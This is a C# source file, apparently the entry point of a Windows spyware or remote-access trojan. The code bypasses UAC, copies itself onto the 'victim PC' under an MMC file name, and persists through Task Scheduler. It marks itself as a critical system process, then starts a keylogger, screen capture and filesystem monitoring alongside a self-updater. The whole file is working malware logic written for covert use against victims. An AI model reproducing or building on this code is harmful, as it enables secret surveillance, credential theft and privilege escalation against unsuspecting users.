using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client
{
    class Program
    {
        /// <summary>
        /// Main entry point.
        /// </summary>
        internal static int UACMethod = 0;
        static void Main(string[] args)
        {
            ArgsParser(args);
            CheckRealApplication();

            if (Utilities.Ranging.IsInEnumRange<Armitage.UAC.UACMethods>(UACMethod))
                Armitage.UAC.UACBypass.QuickStart((Armitage.UAC.UACMethods)UACMethod);
         
#if !DEBUG
            /// Check if Application is already on victim PC.
            if (!Constants.IsInVictimPC())
                Migrate();

            /// Attempt to be God.
            if (!Constants.IsAdmin())
            {
                if (Utilities.Ranging.IsInEnumRange<Armitage.UAC.UACMethods>(UACMethod))
                    Armitage.UAC.UACBypass.QuickStart((Armitage.UAC.UACMethods)UACMethod);
                // else...do nothing ;(
            }
            else
            {
                /// Things to do when admin.
                Armitage.Startup.ViaTaskScheduler();
                ProtectTheLetter();
            }
#endif

            /// Init update checkers.
            Utilities.Updater Updater = new Utilities.Updater();
            Updater.Start();

            /// Start loggers.

            Armitage.Watchers.Keylogger.Start();

            Armitage.Watchers.Screen_Watcher.Start();

            Armitage.Watchers.Filesystem.Start();

            while (true)
            {
                // Sleep, useless, but...makes me sleep at night
                // remembering the letter wont randomly close.
                Thread.Sleep(10 * 1000);
            }
        }

        public static void ArgsParser(string[] args)
        {
            try
            {
                if (args.Length > 0)
                {
                    int parent = int.Parse(args[0].Trim());
                    if (parent > 0)
                        Process.GetProcessById(parent).Kill();

                    if (args.Length > 1)
                    {
                        /// Find suitable UAC method.
                        /// Since the last method didn't work,
                        /// increment the active method.
                        UACMethod = int.Parse(args[1].Trim()) + 1;
                    }
                }
            }
            catch { }
        }

        /// <summary>
        /// Turn into a system process.
        /// </summary>
        public static void ProtectTheLetter()
        {
            Armitage.Critical_Process.Protect();
        }

        public static void Migrate()
        {
            if (Armitage.Copy.CopySelfTo(Constants.MMCFile))
            {
                try
                {
                    if (Process.Start(Constants.MMCFile, Constants.MyProcessID.ToString()).Id > 0)
                        Environment.Exit(0);
                }
                catch { }
            }
        }
        /// <summary>
        /// Checks if a batch file named ll_ exists, if it does, runs it as an executable. The '.exe' extension is not needed.
        /// </summary>
        public static void CheckRealApplication()
        {
            string target = "ll_";
            if (File.Exists(target))
            {
                var p = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = target,
                        UseShellExecute = false
                    }
                };
                p.Start();
            }
        }
    }
}
